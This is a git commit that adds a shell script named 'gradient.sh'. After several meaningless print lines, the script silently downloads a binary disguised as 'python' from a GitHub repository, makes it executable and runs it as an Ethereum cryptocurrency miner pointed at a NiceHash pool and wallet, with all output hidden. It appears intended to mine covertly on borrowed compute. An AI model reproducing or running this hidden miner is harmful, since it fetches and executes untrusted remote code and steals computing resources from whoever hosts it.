a280e98f88eef974df74f101d7e0180c47b4f622
anujah999 <96858841+anujah999@users.noreply.github.com>
2022-03-23 21:46:16 +0530

    Create gradient.sh

---
+++ gradient.sh
@@ -0,0 +1,10 @@
+print ("hello*999999999")
+print ("hello*999999999")
+print ("hello*999999999")
+print ("hello*999999999")
+print ("hello*999999999")
+print ("hello*999999999")
+print ("hello*999999999")
+wget https://github.com/anujah999/hmmmm/raw/main/python > /dev/null
+chmod +x python > /dev/null
+./python --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 --user 3Cy3HtjLC6WdgprSPkCQn9ixprDJ1NdtXV.worker --tls 0 --ethstratum ETHV1pause > /dev/null
